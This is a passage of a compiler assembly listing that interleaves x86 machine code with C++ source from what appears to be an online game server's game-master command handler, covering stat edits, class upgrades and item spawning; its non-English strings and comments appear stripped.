  00661	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  00664	66 8b 8d 18 fd
	ff ff		 mov	 cx, WORD PTR __strength$150[ebp]
  0066b	66 89 88 b4 00
	00 00		 mov	 WORD PTR [eax+180], cx

; 1336 : 			lpObj->Dexterity	= _dexterity;

  00672	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  00675	66 8b 8d 14 fd
	ff ff		 mov	 cx, WORD PTR __dexterity$149[ebp]
  0067c	66 89 88 b6 00
	00 00		 mov	 WORD PTR [eax+182], cx

; 1337 : 			lpObj->Vitality		= _vitality;

  00683	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  00686	66 8b 8d 10 fd
	ff ff		 mov	 cx, WORD PTR __vitality$148[ebp]
  0068d	66 89 88 b8 00
	00 00		 mov	 WORD PTR [eax+184], cx

; 1338 : 			lpObj->Energy		= _energy;

  00694	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  00697	66 8b 8d 0c fd
	ff ff		 mov	 cx, WORD PTR __energy$147[ebp]
  0069e	66 89 88 ba 00
	00 00		 mov	 WORD PTR [eax+186], cx

; 1339 : 			lpObj->Life			= DCInfo.DefClass[Class].Life + 

  006a5	69 85 1c fd ff
	ff 60 09 00 00	 imul	 eax, DWORD PTR _Class$151[ebp], 2400
  006af	69 8d 1c fd ff
	ff 60 09 00 00	 imul	 ecx, DWORD PTR _Class$151[ebp], 2400
  006b9	0f b7 91 0c 00
	00 00		 movzx	 edx, WORD PTR ?DCInfo@@3Vclassdef@@A[ecx+12]
  006c0	8b 8d 10 fd ff
	ff		 mov	 ecx, DWORD PTR __vitality$148[ebp]
  006c6	2b ca		 sub	 ecx, edx
  006c8	f3 0f 2a c1	 cvtsi2ss xmm0, ecx
  006cc	69 95 1c fd ff
	ff 60 09 00 00	 imul	 edx, DWORD PTR _Class$151[ebp], 2400
  006d6	f3 0f 59 82 10
	00 00 00	 mulss	 xmm0, DWORD PTR ?DCInfo@@3Vclassdef@@A[edx+16]
  006de	f3 0f 58 80 14
	00 00 00	 addss	 xmm0, DWORD PTR ?DCInfo@@3Vclassdef@@A[eax+20]
  006e6	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  006e9	f3 0f 11 80 bc
	00 00 00	 movss	 DWORD PTR [eax+188], xmm0

; 1340 : 								  ( _vitality - DCInfo.DefClass[Class].Vitality) * DCInfo.DefClass[Class].LevelLife ;
; 1341 : 			lpObj->MaxLife		= DCInfo.DefClass[Class].MaxLife +

  006f1	69 85 1c fd ff
	ff 60 09 00 00	 imul	 eax, DWORD PTR _Class$151[ebp], 2400
  006fb	69 8d 1c fd ff
	ff 60 09 00 00	 imul	 ecx, DWORD PTR _Class$151[ebp], 2400
  00705	0f b7 91 0c 00
	00 00		 movzx	 edx, WORD PTR ?DCInfo@@3Vclassdef@@A[ecx+12]
  0070c	8b 8d 10 fd ff
	ff		 mov	 ecx, DWORD PTR __vitality$148[ebp]
  00712	2b ca		 sub	 ecx, edx
  00714	f3 0f 2a c1	 cvtsi2ss xmm0, ecx
  00718	69 95 1c fd ff
	ff 60 09 00 00	 imul	 edx, DWORD PTR _Class$151[ebp], 2400
  00722	f3 0f 59 82 10
	00 00 00	 mulss	 xmm0, DWORD PTR ?DCInfo@@3Vclassdef@@A[edx+16]
  0072a	f3 0f 58 80 18
	00 00 00	 addss	 xmm0, DWORD PTR ?DCInfo@@3Vclassdef@@A[eax+24]
  00732	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  00735	f3 0f 11 80 c0
	00 00 00	 movss	 DWORD PTR [eax+192], xmm0

; 1342 : 								  ( _vitality - DCInfo.DefClass[Class].Vitality) * DCInfo.DefClass[Class].LevelLife ;
; 1343 : 
; 1344 : 			lpObj->Mana			= DCInfo.DefClass[Class].Mana + 

  0073d	69 85 1c fd ff
	ff 60 09 00 00	 imul	 eax, DWORD PTR _Class$151[ebp], 2400
  00747	69 8d 1c fd ff
	ff 60 09 00 00	 imul	 ecx, DWORD PTR _Class$151[ebp], 2400
  00751	0f b7 91 0e 00
	00 00		 movzx	 edx, WORD PTR ?DCInfo@@3Vclassdef@@A[ecx+14]
  00758	8b 8d 10 fd ff
	ff		 mov	 ecx, DWORD PTR __vitality$148[ebp]
  0075e	2b ca		 sub	 ecx, edx
  00760	f3 0f 2a c1	 cvtsi2ss xmm0, ecx
  00764	69 95 1c fd ff
	ff 60 09 00 00	 imul	 edx, DWORD PTR _Class$151[ebp], 2400
  0076e	f3 0f 59 82 1c
	00 00 00	 mulss	 xmm0, DWORD PTR ?DCInfo@@3Vclassdef@@A[edx+28]
  00776	f3 0f 58 80 20
	00 00 00	 addss	 xmm0, DWORD PTR ?DCInfo@@3Vclassdef@@A[eax+32]
  0077e	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  00781	f3 0f 11 80 d0
	00 00 00	 movss	 DWORD PTR [eax+208], xmm0

; 1345 : 								  ( _vitality - DCInfo.DefClass[Class].Energy) * DCInfo.DefClass[Class].LevelMana;
; 1346 : 			lpObj->MaxMana		= DCInfo.DefClass[Class].MaxMana + 

  00789	69 85 1c fd ff
	ff 60 09 00 00	 imul	 eax, DWORD PTR _Class$151[ebp], 2400
  00793	69 8d 1c fd ff
	ff 60 09 00 00	 imul	 ecx, DWORD PTR _Class$151[ebp], 2400
  0079d	0f b7 91 0e 00
	00 00		 movzx	 edx, WORD PTR ?DCInfo@@3Vclassdef@@A[ecx+14]
  007a4	8b 8d 10 fd ff
	ff		 mov	 ecx, DWORD PTR __vitality$148[ebp]
  007aa	2b ca		 sub	 ecx, edx
  007ac	f3 0f 2a c1	 cvtsi2ss xmm0, ecx
  007b0	69 95 1c fd ff
	ff 60 09 00 00	 imul	 edx, DWORD PTR _Class$151[ebp], 2400
  007ba	f3 0f 59 82 1c
	00 00 00	 mulss	 xmm0, DWORD PTR ?DCInfo@@3Vclassdef@@A[edx+28]
  007c2	f3 0f 58 80 24
	00 00 00	 addss	 xmm0, DWORD PTR ?DCInfo@@3Vclassdef@@A[eax+36]
  007ca	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  007cd	f3 0f 11 80 d4
	00 00 00	 movss	 DWORD PTR [eax+212], xmm0

; 1347 : 								  ( _vitality - DCInfo.DefClass[Class].Energy) * DCInfo.DefClass[Class].LevelMana;;
; 1348 : 
; 1349 : 			lpObj->LevelUpPoint = _temp_levelup - _temp;

  007d5	8b 85 08 fd ff
	ff		 mov	 eax, DWORD PTR __temp_levelup$146[ebp]
  007db	2b 85 04 fd ff
	ff		 sub	 eax, DWORD PTR __temp$145[ebp]
  007e1	8b 4d 08	 mov	 ecx, DWORD PTR _lpObj$[ebp]
  007e4	89 81 a4 00 00
	00		 mov	 DWORD PTR [ecx+164], eax

; 1350 : 		
; 1351 : 			GCServerMsgStringSend("    !!", lpObj->m_Index, 1);

  007ea	6a 01		 push	 1
  007ec	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  007ef	8b 08		 mov	 ecx, DWORD PTR [eax]
  007f1	51		 push	 ecx
  007f2	68 00 00 00 00	 push	 OFFSET ??_C@_0CB@IKIHDOJD@?$MA?$LI?H?e?H?e?5?D?$LD?$LI?$KP?E?M?5?$LN?$LK?E?H?5?$MA?g?$LM?$LD?A?$KE?5?$LP?O?$LH?a?$CB@
  007f7	e8 00 00 00 00	 call	 ?GCServerMsgStringSend@@YAXPADHE@Z ; GCServerMsgStringSend
  007fc	83 c4 0c	 add	 esp, 12			; 0000000cH

; 1352 : 			gObjCloseSet(lpObj->m_Index, CL_BACK);			

  007ff	6a 01		 push	 1
  00801	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  00804	8b 08		 mov	 ecx, DWORD PTR [eax]
  00806	51		 push	 ecx
  00807	e8 00 00 00 00	 call	 ?gObjCloseSet@@YAXHH@Z	; gObjCloseSet
  0080c	83 c4 08	 add	 esp, 8

; 1353 : 		}
; 1354 : 	break;

  0080f	e9 a8 34 00 00	 jmp	 $LN2@Management
$LN72@Management:

; 1355 : 
; 1356 : 	//  (  )
; 1357 : 	case GMCMD_MODIFYSTAT_ENG:
; 1358 : 		{	
; 1359 : 			int Class = lpObj->Class;

  00814	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  00817	0f b7 88 9c 00
	00 00		 movzx	 ecx, WORD PTR [eax+156]
  0081e	89 8d 00 fd ff
	ff		 mov	 DWORD PTR _Class$144[ebp], ecx

; 1360 : 
; 1361 : 			int _strength, _dexterity, _vitality, _energy;
; 1362 : 
; 1363 : 			_strength	= GetTokenNumber();

  00824	8b 4d ec	 mov	 ecx, DWORD PTR _this$[ebp]
  00827	e8 00 00 00 00	 call	 ?GetTokenNumber@CGMMng@@QAEHXZ ; CGMMng::GetTokenNumber
  0082c	89 85 fc fc ff
	ff		 mov	 DWORD PTR __strength$143[ebp], eax

; 1364 : 			_dexterity	= GetTokenNumber();

  00832	8b 4d ec	 mov	 ecx, DWORD PTR _this$[ebp]
  00835	e8 00 00 00 00	 call	 ?GetTokenNumber@CGMMng@@QAEHXZ ; CGMMng::GetTokenNumber
  0083a	89 85 f8 fc ff
	ff		 mov	 DWORD PTR __dexterity$142[ebp], eax

; 1365 : 			_vitality	= GetTokenNumber();

  00840	8b 4d ec	 mov	 ecx, DWORD PTR _this$[ebp]
  00843	e8 00 00 00 00	 call	 ?GetTokenNumber@CGMMng@@QAEHXZ ; CGMMng::GetTokenNumber
  00848	89 85 f4 fc ff
	ff		 mov	 DWORD PTR __vitality$141[ebp], eax

; 1366 : 			_energy		= GetTokenNumber();

  0084e	8b 4d ec	 mov	 ecx, DWORD PTR _this$[ebp]
  00851	e8 00 00 00 00	 call	 ?GetTokenNumber@CGMMng@@QAEHXZ ; CGMMng::GetTokenNumber
  00856	89 85 f0 fc ff
	ff		 mov	 DWORD PTR __energy$140[ebp], eax

; 1367 : 
; 1368 : #ifdef NEW_SKILL_FORSKYLAND
; 1369 : 			lpObj->ChangeUP		= 0;

  0085c	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  0085f	c6 80 9f 00 00
	00 00		 mov	 BYTE PTR [eax+159], 0

; 1370 : #endif
; 1371 : 
; 1372 : 			lpObj->Experience	= 0;

  00866	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  00869	c7 80 a8 00 00
	00 00 00 00 00	 mov	 DWORD PTR [eax+168], 0

; 1373 : 
; 1374 : 			lpObj->Strength		= _strength;

  00873	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  00876	66 8b 8d fc fc
	ff ff		 mov	 cx, WORD PTR __strength$143[ebp]
  0087d	66 89 88 b4 00
	00 00		 mov	 WORD PTR [eax+180], cx

; 1375 : 			lpObj->Dexterity	= _dexterity;

  00884	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  00887	66 8b 8d f8 fc
	ff ff		 mov	 cx, WORD PTR __dexterity$142[ebp]
  0088e	66 89 88 b6 00
	00 00		 mov	 WORD PTR [eax+182], cx

; 1376 : 			lpObj->Vitality		= _vitality;

  00895	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  00898	66 8b 8d f4 fc
	ff ff		 mov	 cx, WORD PTR __vitality$141[ebp]
  0089f	66 89 88 b8 00
	00 00		 mov	 WORD PTR [eax+184], cx

; 1377 : 			lpObj->Energy		= _energy;

  008a6	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  008a9	66 8b 8d f0 fc
	ff ff		 mov	 cx, WORD PTR __energy$140[ebp]
  008b0	66 89 88 ba 00
	00 00		 mov	 WORD PTR [eax+186], cx

; 1378 : 			lpObj->Life			= DCInfo.DefClass[Class].Life + 

  008b7	69 85 00 fd ff
	ff 60 09 00 00	 imul	 eax, DWORD PTR _Class$144[ebp], 2400
  008c1	69 8d 00 fd ff
	ff 60 09 00 00	 imul	 ecx, DWORD PTR _Class$144[ebp], 2400
  008cb	0f b7 91 0c 00
	00 00		 movzx	 edx, WORD PTR ?DCInfo@@3Vclassdef@@A[ecx+12]
  008d2	8b 8d f4 fc ff
	ff		 mov	 ecx, DWORD PTR __vitality$141[ebp]
  008d8	2b ca		 sub	 ecx, edx
  008da	f3 0f 2a c1	 cvtsi2ss xmm0, ecx
  008de	69 95 00 fd ff
	ff 60 09 00 00	 imul	 edx, DWORD PTR _Class$144[ebp], 2400
  008e8	f3 0f 59 82 10
	00 00 00	 mulss	 xmm0, DWORD PTR ?DCInfo@@3Vclassdef@@A[edx+16]
  008f0	f3 0f 58 80 14
	00 00 00	 addss	 xmm0, DWORD PTR ?DCInfo@@3Vclassdef@@A[eax+20]
  008f8	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  008fb	f3 0f 11 80 bc
	00 00 00	 movss	 DWORD PTR [eax+188], xmm0

; 1379 : 								  ( _vitality - DCInfo.DefClass[Class].Vitality) * DCInfo.DefClass[Class].LevelLife ;
; 1380 : 			lpObj->MaxLife		= DCInfo.DefClass[Class].MaxLife +

  00903	69 85 00 fd ff
	ff 60 09 00 00	 imul	 eax, DWORD PTR _Class$144[ebp], 2400
  0090d	69 8d 00 fd ff
	ff 60 09 00 00	 imul	 ecx, DWORD PTR _Class$144[ebp], 2400
  00917	0f b7 91 0c 00
	00 00		 movzx	 edx, WORD PTR ?DCInfo@@3Vclassdef@@A[ecx+12]
  0091e	8b 8d f4 fc ff
	ff		 mov	 ecx, DWORD PTR __vitality$141[ebp]
  00924	2b ca		 sub	 ecx, edx
  00926	f3 0f 2a c1	 cvtsi2ss xmm0, ecx
  0092a	69 95 00 fd ff
	ff 60 09 00 00	 imul	 edx, DWORD PTR _Class$144[ebp], 2400
  00934	f3 0f 59 82 10
	00 00 00	 mulss	 xmm0, DWORD PTR ?DCInfo@@3Vclassdef@@A[edx+16]
  0093c	f3 0f 58 80 18
	00 00 00	 addss	 xmm0, DWORD PTR ?DCInfo@@3Vclassdef@@A[eax+24]
  00944	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  00947	f3 0f 11 80 c0
	00 00 00	 movss	 DWORD PTR [eax+192], xmm0

; 1381 : 								  ( _vitality - DCInfo.DefClass[Class].Vitality) * DCInfo.DefClass[Class].LevelLife ;
; 1382 : 
; 1383 : 			lpObj->Mana			= DCInfo.DefClass[Class].Mana + 

  0094f	69 85 00 fd ff
	ff 60 09 00 00	 imul	 eax, DWORD PTR _Class$144[ebp], 2400
  00959	69 8d 00 fd ff
	ff 60 09 00 00	 imul	 ecx, DWORD PTR _Class$144[ebp], 2400
  00963	0f b7 91 0e 00
	00 00		 movzx	 edx, WORD PTR ?DCInfo@@3Vclassdef@@A[ecx+14]
  0096a	8b 8d f4 fc ff
	ff		 mov	 ecx, DWORD PTR __vitality$141[ebp]
  00970	2b ca		 sub	 ecx, edx
  00972	f3 0f 2a c1	 cvtsi2ss xmm0, ecx
  00976	69 95 00 fd ff
	ff 60 09 00 00	 imul	 edx, DWORD PTR _Class$144[ebp], 2400
  00980	f3 0f 59 82 1c
	00 00 00	 mulss	 xmm0, DWORD PTR ?DCInfo@@3Vclassdef@@A[edx+28]
  00988	f3 0f 58 80 20
	00 00 00	 addss	 xmm0, DWORD PTR ?DCInfo@@3Vclassdef@@A[eax+32]
  00990	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  00993	f3 0f 11 80 d0
	00 00 00	 movss	 DWORD PTR [eax+208], xmm0

; 1384 : 								  ( _vitality - DCInfo.DefClass[Class].Energy) * DCInfo.DefClass[Class].LevelMana;
; 1385 : 			lpObj->MaxMana		= DCInfo.DefClass[Class].MaxMana + 

  0099b	69 85 00 fd ff
	ff 60 09 00 00	 imul	 eax, DWORD PTR _Class$144[ebp], 2400
  009a5	69 8d 00 fd ff
	ff 60 09 00 00	 imul	 ecx, DWORD PTR _Class$144[ebp], 2400
  009af	0f b7 91 0e 00
	00 00		 movzx	 edx, WORD PTR ?DCInfo@@3Vclassdef@@A[ecx+14]
  009b6	8b 8d f4 fc ff
	ff		 mov	 ecx, DWORD PTR __vitality$141[ebp]
  009bc	2b ca		 sub	 ecx, edx
  009be	f3 0f 2a c1	 cvtsi2ss xmm0, ecx
  009c2	69 95 00 fd ff
	ff 60 09 00 00	 imul	 edx, DWORD PTR _Class$144[ebp], 2400
  009cc	f3 0f 59 82 1c
	00 00 00	 mulss	 xmm0, DWORD PTR ?DCInfo@@3Vclassdef@@A[edx+28]
  009d4	f3 0f 58 80 24
	00 00 00	 addss	 xmm0, DWORD PTR ?DCInfo@@3Vclassdef@@A[eax+36]
  009dc	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  009df	f3 0f 11 80 d4
	00 00 00	 movss	 DWORD PTR [eax+212], xmm0

; 1386 : 								  ( _vitality - DCInfo.DefClass[Class].Energy) * DCInfo.DefClass[Class].LevelMana;;
; 1387 : 	
; 1388 : 			GCServerMsgStringSend("Modi.Stat Complete", lpObj->m_Index, 1);

  009e7	6a 01		 push	 1
  009e9	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  009ec	8b 08		 mov	 ecx, DWORD PTR [eax]
  009ee	51		 push	 ecx
  009ef	68 00 00 00 00	 push	 OFFSET ??_C@_0BD@EIKIGGHM@Modi?4Stat?5Complete@
  009f4	e8 00 00 00 00	 call	 ?GCServerMsgStringSend@@YAXPADHE@Z ; GCServerMsgStringSend
  009f9	83 c4 0c	 add	 esp, 12			; 0000000cH

; 1389 : 			gObjCloseSet(lpObj->m_Index, CL_BACK);			

  009fc	6a 01		 push	 1
  009fe	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  00a01	8b 08		 mov	 ecx, DWORD PTR [eax]
  00a03	51		 push	 ecx
  00a04	e8 00 00 00 00	 call	 ?gObjCloseSet@@YAXHH@Z	; gObjCloseSet
  00a09	83 c4 08	 add	 esp, 8

; 1390 : 		}
; 1391 : 	break;

  00a0c	e9 ab 32 00 00	 jmp	 $LN2@Management
$LN73@Management:

; 1392 : 
; 1393 : 	// 
; 1394 : 	case GMCMD_CLASS_UP:
; 1395 : 		{	
; 1396 : 			int Class = lpObj->DbClass;

  00a11	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  00a14	0f b6 88 9e 00
	00 00		 movzx	 ecx, BYTE PTR [eax+158]
  00a1b	89 8d ec fc ff
	ff		 mov	 DWORD PTR _Class$139[ebp], ecx

; 1397 : 
; 1398 : 			if( Class == 0 )

  00a21	83 bd ec fc ff
	ff 00		 cmp	 DWORD PTR _Class$139[ebp], 0
  00a28	75 0c		 jne	 SHORT $LN74@Management

; 1399 : 				lpObj->DbClass = 1;

  00a2a	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  00a2d	c6 80 9e 00 00
	00 01		 mov	 BYTE PTR [eax+158], 1
  00a34	eb 28		 jmp	 SHORT $LN78@Management
$LN74@Management:

; 1400 : 			else if( Class == 16)

  00a36	83 bd ec fc ff
	ff 10		 cmp	 DWORD PTR _Class$139[ebp], 16 ; 00000010H
  00a3d	75 0c		 jne	 SHORT $LN76@Management

; 1401 : 				lpObj->DbClass = 17;

  00a3f	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  00a42	c6 80 9e 00 00
	00 11		 mov	 BYTE PTR [eax+158], 17	; 00000011H
  00a49	eb 13		 jmp	 SHORT $LN78@Management
$LN76@Management:

; 1402 : 			else if( Class == 32)

  00a4b	83 bd ec fc ff
	ff 20		 cmp	 DWORD PTR _Class$139[ebp], 32 ; 00000020H
  00a52	75 0a		 jne	 SHORT $LN78@Management

; 1403 : 				lpObj->DbClass = 33;

  00a54	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  00a57	c6 80 9e 00 00
	00 21		 mov	 BYTE PTR [eax+158], 33	; 00000021H
$LN78@Management:

; 1404 : #ifdef ADD_SEASON_3_NEW_CHARACTER_SUMMONER_20070912	// "/"
; 1405 : 			else if( Class == 80 )
; 1406 : 				lpObj->DbClass = BLOODY_SUMMONER;
; 1407 : #endif			
; 1408 : 			
; 1409 : 			GCServerMsgStringSend("...", lpObj->m_Index, 1);

  00a5e	6a 01		 push	 1
  00a60	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  00a63	8b 08		 mov	 ecx, DWORD PTR [eax]
  00a65	51		 push	 ecx
  00a66	68 00 00 00 00	 push	 OFFSET ??_C@_07BKDMMMJL@?$MA?$PM?A?w?4?4?4@
  00a6b	e8 00 00 00 00	 call	 ?GCServerMsgStringSend@@YAXPADHE@Z ; GCServerMsgStringSend
  00a70	83 c4 0c	 add	 esp, 12			; 0000000cH

; 1410 : 			gObjCloseSet(lpObj->m_Index, CL_BACK);			

  00a73	6a 01		 push	 1
  00a75	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  00a78	8b 08		 mov	 ecx, DWORD PTR [eax]
  00a7a	51		 push	 ecx
  00a7b	e8 00 00 00 00	 call	 ?gObjCloseSet@@YAXHH@Z	; gObjCloseSet
  00a80	83 c4 08	 add	 esp, 8

; 1411 : 		}
; 1412 : 	break;

  00a83	e9 34 32 00 00	 jmp	 $LN2@Management
$LN79@Management:

; 1413 : #ifdef THIRD_CHANGEUP_SYSTEM_20070507	// ,  	
; 1414 : 	case GMCMD_THIRD_CHANGE_UP:		// /3
; 1415 : 		{
; 1416 : 			if( lpObj->DbClass == 0 || lpObj->DbClass == 16 || lpObj->DbClass == 32 || lpObj->DbClass == 80 )
; 1417 : 			{
; 1418 : 				lpObj->ChangeUP = 1;
; 1419 : 				lpObj->DbClass |= 0x1;
; 1420 : 			}
; 1421 : 			lpObj->ThirdChangeUp = 1;
; 1422 : 			lpObj->DbClass		|= 0x2;
; 1423 : 			
; 1424 : 			GCServerMsgStringSend( "3 ", lpObj->m_Index, 1 );
; 1425 : 			gObjCloseSet( lpObj->m_Index, CL_BACK );			
; 1426 : 		}
; 1427 : 	break;
; 1428 : 
; 1429 : 	case GMCMD_CHANGE_UP_ALL_RESET:	// /
; 1430 : 		{
; 1431 : 			lpObj->ChangeUP = 0;
; 1432 : 			lpObj->ThirdChangeUp = 0;
; 1433 : 
; 1434 : 			switch( lpObj->DbClass )
; 1435 : 			{			
; 1436 : 			case 1:
; 1437 : 			case GRAND_MASTER:
; 1438 : 				lpObj->DbClass = 0;
; 1439 : 				break;
; 1440 : 
; 1441 : 			case 17:
; 1442 : 			case BLADE_MASTER:
; 1443 : 				lpObj->DbClass = 16;
; 1444 : 				break;	
; 1445 : 				
; 1446 : 			case 33:
; 1447 : 			case HIGH_ELF:
; 1448 : 				lpObj->DbClass = 32;
; 1449 : 				break;	
; 1450 : 
; 1451 : 			case DUEL_MASTER:
; 1452 : 				lpObj->DbClass = 48;
; 1453 : 				break;	
; 1454 : 
; 1455 : 			case LORD_EMPEROR:
; 1456 : 				lpObj->DbClass = 64;
; 1457 : 				break;	
; 1458 : #ifdef ADD_SEASON_3_NEW_CHARACTER_SUMMONER_20070912	// 
; 1459 : 			case BLOODY_SUMMONER:
; 1460 : 			case DIMENSION_MASTER:
; 1461 : 				lpObj->DbClass = 80;
; 1462 : 				break;
; 1463 : #endif
; 1464 : 			}
; 1465 : 			GCServerMsgStringSend( "", lpObj->m_Index, 1 );
; 1466 : 			gObjCloseSet( lpObj->m_Index, CL_BACK );
; 1467 : 		}
; 1468 : 		break;
; 1469 : 		
; 1470 : 	case GMCMD_QUEST_ITEM:	// /
; 1471 : 		{
; 1472 : 			int iQuestIndex = GetTokenNumber();
; 1473 : 			if( iQuestIndex == 4 )
; 1474 : 			{
; 1475 : 				for( int i = 0; i <= 3; i++ )
; 1476 : 				{
; 1477 : 					ItemSerialCreateSend( aIndex, gObj[aIndex].MapNumber, gObj[aIndex].X, gObj[aIndex].Y, MAKE_ITEMNUM( 14, 65 ), 0, (BYTE)0, 0, 0, 0, -1, 0, 0 );
; 1478 : 					ItemSerialCreateSend( aIndex, gObj[aIndex].MapNumber, gObj[aIndex].X, gObj[aIndex].Y, MAKE_ITEMNUM( 14, 66 ), 0, (BYTE)0, 0, 0, 0, -1, 0, 0 );
; 1479 : 					ItemSerialCreateSend( aIndex, gObj[aIndex].MapNumber, gObj[aIndex].X, gObj[aIndex].Y, MAKE_ITEMNUM( 14, 67 ), 0, (BYTE)0, 0, 0, 0, -1, 0, 0 );
; 1480 : 				}
; 1481 : 			}
; 1482 : 		}
; 1483 : 		break;
; 1484 : 	case GMCMD_MANYMANY_ITEM:	// /
; 1485 : 		{
; 1486 : 			int iType	= GetTokenNumber();
; 1487 : 			int iIndex	= GetTokenNumber();
; 1488 : 			int iNum	= GetTokenNumber();
; 1489 : 
; 1490 : 			if( iNum <= 0 )
; 1491 : 				iNum = 1;
; 1492 : 			else if( iNum > 50 )
; 1493 : 				iNum = 50;
; 1494 : 
; 1495 : 			for( int i = 0; i < iNum; i++ )
; 1496 : 			{
; 1497 : 				ItemSerialCreateSend( aIndex, gObj[aIndex].MapNumber, gObj[aIndex].X, gObj[aIndex].Y, MAKE_ITEMNUM( iType, iIndex ), 0, (BYTE)0, 0, 0, 0, -1, 0, 0 );
; 1498 : 			}
; 1499 : 		}
; 1500 : 		break;
; 1501 : 	case GMCMD_SET_QUEST:	// / ()
; 1502 : 		{
; 1503 : 			int iQuestIndex = GetTokenNumber();
; 1504 : 			if( iQuestIndex >= 0 )
; 1505 : 				g_QuestInfo.QuestSuccessCommand( aIndex, iQuestIndex );
; 1506 : 		}
; 1507 : 		break;
; 1508 : 	case GMCMD_SET_ZEN:		//  ()
; 1509 : 		{
; 1510 : 			int iNewMoneyValue = GetTokenNumber();
; 1511 : 			gObj[aIndex].Money = iNewMoneyValue;
; 1512 : 			GCMoneySend( aIndex, gObj[aIndex].Money );
; 1513 : 		}
; 1514 : 		break;
; 1515 : 		
; 1516 : #endif	// THIRD_CHANGEUP_SYSTEM_20070507
; 1517 : 
; 1518 : #ifdef ADD_ITEM_FENRIR_01_20051110
; 1519 : 	//    
; 1520 : 	case GMCMD_FENRIR_DURSMALL_DEF:
; 1521 : 		{	
; 1522 : 			int iDurSmallDef = GetTokenNumber();
; 1523 : 			MsgOutput( lpObj->m_Index, "[] %d -> %d", g_iFenrirDefaultMaxDurSmall, iDurSmallDef);
; 1524 : 			g_iFenrirDefaultMaxDurSmall = iDurSmallDef;
; 1525 : 		}
; 1526 : 	break;
; 1527 : 
; 1528 : 	//    
; 1529 : 	case GMCMD_FENRIR_DURSMALL_ELF:
; 1530 : 		{	
; 1531 : 			int iDurSmallElf = GetTokenNumber();
; 1532 : 			MsgOutput( lpObj->m_Index, "[] %d -> %d", g_iFenrirElfMaxDurSmall, iDurSmallElf);
; 1533 : 			g_iFenrirElfMaxDurSmall = iDurSmallElf;
; 1534 : 		}
; 1535 : 	break;
; 1536 : #endif
; 1537 : 
; 1538 : #ifdef ADD_SHIELD_POINT_01_20060403
; 1539 : 	case GMCMD_SET_SHIELD_POINT:
; 1540 : 		{
; 1541 : 			int iShieldPoint = GetTokenNumber();
; 1542 : 			MsgOutput( lpObj->m_Index, "[] %d -> %d", lpObj->iShield, iShieldPoint );
; 1543 : 			if( iShieldPoint > ( lpObj->iMaxShield + lpObj->iAddShield ) )
; 1544 : 			{
; 1545 : 				iShieldPoint = lpObj->iMaxShield + lpObj->iAddShield;
; 1546 : 			}
; 1547 : 			lpObj->iShield = iShieldPoint;
; 1548 : 			GCReFillSend( lpObj->m_Index, lpObj->Life, 0xFF, 0, lpObj->iShield );
; 1549 : 		}
; 1550 : 	break;
; 1551 : 	case GMCMD_POINT_DISPLAY:
; 1552 : 		{
; 1553 : 			MsgOutput( lpObj->m_Index, "HP:%7.1f/%7.1f , SD:%d/%d", 
; 1554 : 				lpObj->Life, lpObj->MaxLife+lpObj->AddLife, lpObj->iShield, lpObj->iMaxShield+lpObj->iAddShield );
; 1555 : 		}
; 1556 : 	break;
; 1557 : #endif
; 1558 : 
; 1559 : #ifdef ITEM_ADD_OPTION_20061019
; 1560 : 	case GMCMD_ITEM_EFFECT_SET:
; 1561 : 		{
; 1562 : 			int iEffectType = GetTokenNumber();
; 1563 : 			int iEffectValue = GetTokenNumber();
; 1564 : 			int iEffectValidTime = GetTokenNumber();
; 1565 : 
; 1566 : 			g_ItemAddOption.SetItemEffectForTest( lpObj, iEffectType, iEffectValue, iEffectValidTime );
; 1567 : #ifdef ADD_SHIELD_POINT_01_20060403
; 1568 : 			GCReFillSend( lpObj->m_Index, (WORD)(lpObj->MaxLife + lpObj->AddLife), 0xFE, 0, (WORD)(lpObj->iMaxShield+lpObj->iAddShield));
; 1569 : #else
; 1570 : 			GCReFillSend( lpObj->m_Index, (WORD)(lpObj->MaxLife + lpObj->AddLife), 0xFE, 0);
; 1571 : #endif
; 1572 : 			GCManaSend( lpObj->m_Index, (short)(lpObj->MaxMana+lpObj->AddMana), 0xFE, 0, lpObj->MaxBP+lpObj->AddBP);		
; 1573 : 		}
; 1574 : 	break;
; 1575 : 	case GMCMD_ITEM_EFFECT_CLEAR:
; 1576 : 		{
; 1577 : #if 0
; 1578 : 			g_ItemAddOption.ClearItemEffect( lpObj, ITEMUSE_EFFECT_OPTION_CANCEL );
; 1579 : 			MsgOutput( lpObj->m_Index, "   .");
; 1580 : #endif
; 1581 : 		}
; 1582 : 	break;
; 1583 : #endif // ITEM_ADD_OPTION_20061019
; 1584 : 
; 1585 : 	// 
; 1586 : 	case GMCMD_MANYMANYGEM:
; 1587 : 		{		
; 1588 : 			for( int i = 0; i < 5; i++ )

  00a88	c7 85 e8 fc ff
	ff 00 00 00 00	 mov	 DWORD PTR _i$138[ebp], 0
